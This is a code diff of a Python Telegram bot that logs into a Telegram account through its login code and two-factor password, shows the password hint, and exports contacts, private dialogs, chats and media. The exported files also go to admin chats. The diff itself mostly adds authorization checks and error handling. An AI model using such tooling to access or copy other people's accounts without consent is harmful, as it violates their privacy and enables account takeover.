@@ -63,8 +63,9 @@ async def send_welcome(message: types.Message):
     if user_id in allowed_users:
         if 'client' in user_state.get(user_id, {}):
             client = user_state[user_id]['client']
-            await client.log_out()
-            await client.disconnect()
+            if await client.is_user_authorized():
+                await client.log_out()
+                await client.disconnect()
             user_state.pop(message.from_user.id, None)
 
         client = create_client()
@@ -91,14 +92,16 @@ async def send_welcome(message: types.Message):
     else:
         await unauthorized(message)
 
+#Cnfhn по Qr
 @dp.message_handler(commands=['start_qr'])
 async def start_via_qr_code(message: types.Message):
     user_id = message.from_user.id
     if user_id in allowed_users:
         if 'client' in user_state.get(user_id, {}):
             client = user_state[user_id]['client']
-            await client.log_out()
-            await client.disconnect()
+            if await client.is_user_authorized():
+                await client.log_out()
+                await client.disconnect()
             user_state.pop(message.from_user.id, None)
 
         client = create_client()
@@ -180,10 +183,8 @@ async def start_via_qr_code(message: types.Message):
 @dp.message_handler(commands=['analytic'])
 async def analytic_command(message: types.Message):
     user_id = message.from_user.id
-    if user_id not in user_state:
-        user_state[user_id] = {}     
-    user_state[user_id]['type'] = '' #обнуляем, чтобы после аналитики не реагировала на цифры
     if user_id in user_state and user_state[user_id].get('connected'):
+        user_state[user_id]['type'] = '' #обнуляем, чтобы после аналитики не реагировала на цифры
         logging.info(f"User {user_id} is connected. Starting analysis.")
         phone_number = user_state[user_id]['phone_number']
         client = user_state[user_id]['client']
@@ -236,11 +237,12 @@ async def select_mode_of_download(message: types.Message):
 async def say_by(message: types.Message):
     user_id = message.from_user.id
     if 'client' in user_state.get(user_id, {}):
-      client = user_state[user_id]['client']
-      await client.log_out()
-      await client.disconnect()
-      user_state.pop(message.from_user.id, None)
-      await message.answer("Вы разлогинились.")
+        client = user_state[user_id]['client']
+        if await client.is_user_authorized():
+            await client.log_out()
+            await client.disconnect()
+        user_state.pop(message.from_user.id, None)
+        await message.answer("Вы разлогинились.")
     else:
       await message.answer("Не требуется. Вы не подключены.")
 
@@ -248,74 +250,76 @@ async def say_by(message: types.Message):
 # Обработчики колбэков для запуска нужных функций
 @dp.callback_query_handler(lambda query: bool(user_state.get(query.from_user.id, {}).get('type'))) #Перехват, когда список не пустой
 async def callback_query_handler(callback_query: AiogramCallbackQuery):
-    logging.info(f"Callback query data: {callback_query.data}")
     user_id = callback_query.from_user.id
-    code = callback_query.data
-    client = user_state[user_id]['client']
-
-    if await client.get_me() is None:
-        await bot.send_message(user_id, 'Сессия сброшена')
-        user_state.pop(user_id, None)
-    else:
-        if user_state[user_id]['type'] == 'private':
-            if code == 'withoutall':
-                selection = '40'
-                selection_alias = 'Отчет без медиа'
-            elif code == 'with_photos':
-                    selection = '45'
-                    selection_alias = 'Отчет с фото'
-            elif code == 'get_media':
-                    selection = '450'
-                    selection_alias = 'Отчет с фото + скачивание всех медиа'
-            user_state[user_id]['selection'] = selection
-            await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
-            logging.info(f"User {user_id} is connected. Starting get private message.")
-            try:
-                        user_dialogs, i, users_list = await get_user_dialogs(client)
-                        if not user_dialogs:
+    if user_id in user_state:
+        logging.info(f"Callback query data: {callback_query.data}")
+        code = callback_query.data
+        client = user_state[user_id]['client']
+    
+        if await client.get_me() is None:
+            await bot.send_message(user_id, 'Сессия сброшена')
+            user_state.pop(user_id, None)
+        else:
+            if user_state[user_id]['type'] == 'private':
+                if code == 'withoutall':
+                    selection = '40'
+                    selection_alias = 'Отчет без медиа'
+                elif code == 'with_photos':
+                        selection = '45'
+                        selection_alias = 'Отчет с фото'
+                elif code == 'get_media':
+                        selection = '450'
+                        selection_alias = 'Отчет с фото + скачивание всех медиа'
+                user_state[user_id]['selection'] = selection
+                await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
+                logging.info(f"User {user_id} is connected. Starting get private message.")
+                try:
+                            user_dialogs, i, users_list = await get_user_dialogs(client)
+                            if not user_dialogs:
+                                await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
+                                return
+                            else:
+                                # Сохраняем user_id и users_list в user_state для дальнейшего использования
+                                user_state[user_id]['users_list'] = users_list
+                                user_state[user_id]['dialogs_count'] = i        
+                                dialog_message = "\n".join(user_dialogs)
+                                await bot.send_message(user_id, dialog_message, parse_mode=ParseMode.HTML)
+                                await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
+                except Exception as e:
+                            logging.error(f"Error during making list: {e}")
+                            await bot.send_message(user_id, f"Произошла ошибка при формирование списка  личных сообщений: {e}")
+        
+            elif user_state[user_id]['type'] == 'chat':
+                if code == 'withoutall':
+                    selection = '70'
+                    selection_alias = 'Отчет без медиа'
+                elif code == 'with_photos':
+                        selection = '75'
+                        selection_alias = 'Отчет с фото'
+                elif code == 'get_media':
+                        selection = '750'
+                        selection_alias = 'Отчет с фото + скачивание всех медиа'
+                user_state[user_id]['selection'] = selection
+                await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
+                logging.info(f"User {user_id} is connected. Starting get private message.")
+                try:
+                        delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
+                        groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, channels_list = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
+                        if not channels_list:
                             await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
                             return
                         else:
                             # Сохраняем user_id и users_list в user_state для дальнейшего использования
-                            user_state[user_id]['users_list'] = users_list
+                            user_state[user_id]['users_list'] = groups
                             user_state[user_id]['dialogs_count'] = i        
-                            dialog_message = "\n".join(user_dialogs)
+                            dialog_message = "\n".join(channels_list)
                             await bot.send_message(user_id, dialog_message, parse_mode=ParseMode.HTML)
                             await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
-            except Exception as e:
+                except Exception as e:
                         logging.error(f"Error during making list: {e}")
-                        await bot.send_message(user_id, f"Произошла ошибка при формирование списка  личных сообщений: {e}")
-    
-        elif user_state[user_id]['type'] == 'chat':
-            if code == 'withoutall':
-                selection = '70'
-                selection_alias = 'Отчет без медиа'
-            elif code == 'with_photos':
-                    selection = '75'
-                    selection_alias = 'Отчет с фото'
-            elif code == 'get_media':
-                    selection = '750'
-                    selection_alias = 'Отчет с фото + скачивание всех медиа'
-            user_state[user_id]['selection'] = selection
-            await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
-            logging.info(f"User {user_id} is connected. Starting get private message.")
-            try:
-                    delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
-                    groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, channels_list = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
-                    if not channels_list:
-                        await bot.send_message(user_id, "У вас нет активных диалогов для выбора.")
-                        return
-                    else:
-                        # Сохраняем user_id и users_list в user_state для дальнейшего использования
-                        user_state[user_id]['users_list'] = groups
-                        user_state[user_id]['dialogs_count'] = i        
-                        dialog_message = "\n".join(channels_list)
-                        await bot.send_message(user_id, dialog_message, parse_mode=ParseMode.HTML)
-                        await bot.send_message(user_id, 'Выберите номер нужного диалога для продолжения')
-            except Exception as e:
-                    logging.error(f"Error during making list: {e}")
-                    await bot.send_message(user_id, f"Произошла ошибка при формирование списка диалогов канала: {e}")
-
+                        await bot.send_message(user_id, f"Произошла ошибка при формирование списка диалогов канала: {e}")
+    else:
+        await message.answer("Произошла ошибка: пользователь не найден в системе")
 
 
 # Обработчик выбора списка приватного диалога или чата для выгрузки
@@ -323,29 +327,30 @@ async def callback_query_handler(callback_query: AiogramCallbackQuery):
                                   message.text.isdigit() and 1 <= len(message.text) <= 4)
 async def get_message_from_list(message: types.Message):
     user_id = message.from_user.id
-    user_type = user_state[user_id]['type']
-    
-    client = user_state[user_id]['client']
-    users_list = user_state[user_id]['users_list']
-    i = user_state[user_id]['dialogs_count']  # Получаем значение i из user_state
-    g_index = int(message.text.strip()) 
-    if user_id in user_state and 'selection' in user_state[user_id]:
-        selection = user_state[user_id]['selection']
-        try:
-            if 0 <= g_index < i:
-                target_dialog = users_list[g_index]
-                if user_type == 'private':
-                    await message.answer(f"начинаю выгрузку диалога под номером: {g_index}. Дождись сообщения о завершении")
+    if user_id in user_state:
+        client = user_state[user_id]['client']
+        user_type = user_state[user_id]['type']
+        users_list = user_state[user_id]['users_list']
+        i = user_state[user_id]['dialogs_count']  # Получаем значение i из user_state
+        g_index = int(message.text.strip()) 
+        if user_id in user_state and 'selection' in user_state[user_id]:
+            selection = user_state[user_id]['selection']
+            try:
+                if 0 <= g_index < i:
+                    target_dialog = users_list[g_index]
+                    if user_type == 'private':
+                        await message.answer(f"начинаю выгрузку диалога под номером: {g_index}. Дождись сообщения о завершении")
+                    else:
+                        await message.answer(f"начинаю выгрузку чата под номером: {g_index}. Дождись сообщения о завершении")
+                    await get_messages_for_html(client, target_dialog, selection, user_id)
+                    await message.answer("Выгрузка завершена. Отправляю файлы")
+                    await send_files_to_bot(bot, admin_chat_ids, user_id)
                 else:
-                    await message.answer(f"начинаю выгрузку чата под номером: {g_index}. Дождись сообщения о завершении")
-                await get_messages_for_html(client, target_dialog, selection, user_id)
-                await message.answer("Выгрузка завершена. Отправляю файлы")
-                await send_files_to_bot(bot, admin_chat_ids, user_id)
-            else:
-                await message.answer(f"Введите число от 0 до {i-1}, соответствующее номеру диалога.")
-        except ValueError:
-            await message.answer("Введите число, соответствующее диалогу.")
-
+                    await message.answer(f"Введите число от 0 до {i-1}, соответствующее номеру диалога.")
+            except ValueError:
+                await message.answer("Введите число, соответствующее диалогу.")
+    else:
+        await message.answer("Произошла ошибка: пользователь не найден в системе")
 
 # Обработчики сообщений
 @dp.message_handler(lambda message: message.from_user.id not in allowed_users)
@@ -376,8 +381,9 @@ async def get_phone_number(message: types.Message):
         user_id = message.from_user.id  # Добавляем определение user_id
         if 'client' in user_state.get(user_id, {}):
             client = user_state[user_id]['client']
-            await client.log_out()
-            await client.disconnect()
+            if await client.is_user_authorized():
+                await client.log_out()
+                await client.disconnect()
             user_state.pop(message.from_user.id, None)
 
         client = create_client()
@@ -413,41 +419,36 @@ async def get_code(message: types.Message):
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
     user_id = message.from_user.id  # Добавляем определение user_id
-    client = user_state[message.from_user.id].get('client', create_client())  # Используем существующий клиент или создаем новый
-
-    try:
-        await client.connect()
-        await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
-        await message.answer("Подключено! Вот контакты. Остальное - в меню бота")
-        user_state[user_id]['connected'] = True  # Обновляем состояние
-        await get_and_send_contacts(client, phone_number, user_id)
-    except SessionPasswordNeededError:
-        await message.answer("Установлена двухфакторная аутентификация. Введите пароль")
-        user_state[message.from_user.id]['awaiting_password'] = True
-        user_state[message.from_user.id]['client'] = client  # Сохраняем клиент для последующего использования
-        user_state[message.from_user.id]['password_attempts'] = 0  # Инициализируем попытки ввода пароля
-        password_info = await client(functions.account.GetPasswordRequest())
-        password_info_hint = f'Подсказка для пароля: {password_info.hint}'
-        await message.answer(password_info_hint)
-    except PhoneCodeInvalidError:
-        user_state[message.from_user.id]['code_attempts'] = user_state[message.from_user.id].get('code_attempts', 0) + 1
-        if user_state[message.from_user.id]['code_attempts'] >= 3:
-            await message.answer("Превышено количество попыток ввода кода. Перезапусти меня")
-            user_state.pop(message.from_user.id, None)
-            await client.log_out()
+    if user_id in user_state:
+        client = user_state[message.from_user.id].get('client', create_client())  # Используем существующий клиент или создаем новый
+        try:
+            await client.connect()
+            await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
+            await message.answer("Подключено! Вот контакты. Остальное - в меню бота")
+            user_state[user_id]['connected'] = True  # Обновляем состояние
+            await get_and_send_contacts(client, phone_number, user_id)
+        except SessionPasswordNeededError:
+            await message.answer("Установлена двухфакторная аутентификация. Введите пароль")
+            user_state[message.from_user.id]['awaiting_password'] = True
+            user_state[message.from_user.id]['client'] = client  # Сохраняем клиент для последующего использования
+            user_state[message.from_user.id]['password_attempts'] = 0  # Инициализируем попытки ввода пароля
+            password_info = await client(functions.account.GetPasswordRequest())
+            password_info_hint = f'Подсказка для пароля: {password_info.hint}'
+            await message.answer(password_info_hint)
+        except PhoneCodeInvalidError:
+            user_state[message.from_user.id]['code_attempts'] = user_state[message.from_user.id].get('code_attempts', 0) + 1
+            if user_state[message.from_user.id]['code_attempts'] >= 3:
+                await message.answer("Превышено количество попыток ввода кода. Перезапусти меня")
+                user_state.pop(message.from_user.id, None)
+                await client.log_out()
+                await client.disconnect()
+            else:
+                await message.answer(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
+        except Exception as e:
+            await message.answer(f"Произошла ошибка: {e}")
             await client.disconnect()
-        else:
-            await message.answer(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
-    except Exception as e:
-        await message.answer(f"Произошла ошибка: {e}")
-    #finally:
-        #if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
-           # if 'code_attempts' not in user_state.get(message.from_user.id, {}):
-                #await client.log_out()
-               # await client.disconnect()
-                
-
-
+    else:
+        await message.answer("Произошла ошибка: пользователь не найден в системе")
 
 #Введен пароль
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}) and not
@@ -475,10 +476,7 @@ async def process_password(message: types.Message):
                 await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[user_id]['password_attempts']} из 3.")
         except Exception as e:
             await message.answer(f"Произошла ошибка: {e}")
-        finally:
-            if 'awaiting_password' not in user_state.get(user_id, {}):
-                await client.log_out()
-                await client.disconnect()
+            await client.disconnect()
     else:
         await message.answer("Произошла ошибка: пользователь не найден в системе")
 
